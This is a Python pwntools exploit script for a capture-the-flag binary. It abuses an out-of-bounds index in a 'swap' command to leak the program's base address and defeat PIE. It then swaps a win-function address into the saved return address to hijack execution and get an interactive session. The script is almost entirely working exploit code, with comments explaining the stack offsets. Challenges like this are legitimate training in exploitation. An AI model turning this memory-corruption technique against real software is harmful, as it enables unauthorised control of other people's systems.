#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chall')

HOST = '172.17.0.1' # change to remote, this is for testing in Docker containers
PORT = 24067

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

context.terminal = '/usr/bin/true'


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        # Use DEBUG argument to see listening port of gdbserver
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.LOCAL:
        return process([exe.path] + argv, *a, **kw)
    else:
        return remote(HOST, PORT)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
bp main+589
bp main+616
bp main+812
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled


def swap(io: tube, a: int, b: int):
    io.sendlineafter(b'\n> ', f'swap {a} {b}'.encode())

io = start()
# $rbp - 0x110 (fruits[-2]) is $rbp + 0xe0 --> 
# fruits is $rbp - 0x100
# $rbp - 0x10 is pointer to exe + 0x1c0
# return address is $rbp + 0x8
# cmd is $rbp - 0x30

# 1. Leak binary address: Swap with a pointer that points to a pointer that points to a binary
swap(io, 0, 0x1e) # (0x100 - 0x10) / 8 = 0x1e
leak_line = io.recvline(keepends=False)
print(leak_line)
exe_leak = unpack(leak_line.split(b' with ')[1][:6].ljust(8, b'\0'))
exe.address = exe_leak - 0x11e0
assert(exe.address & 0xFFF == 0)
info(f"Got leak {hex(exe_leak)} --> exe: {hex(exe.address)}")

# 2. Bring the win address
io.sendlineafter(b'> ', flat(b'A'*8, exe.sym['_Z3winv']))
# 3. Swap the win address into the return address
# return address: 0x8 - (-0x100) = 0x21
# Pointer @ cmd[8] = (-0x30 + 0x8) - -0x100 = 0xd8
swap(io, 0x21, 0x1b)
# 4. Profit
io.sendlineafter(b'> ', b'finish')

io.interactive()

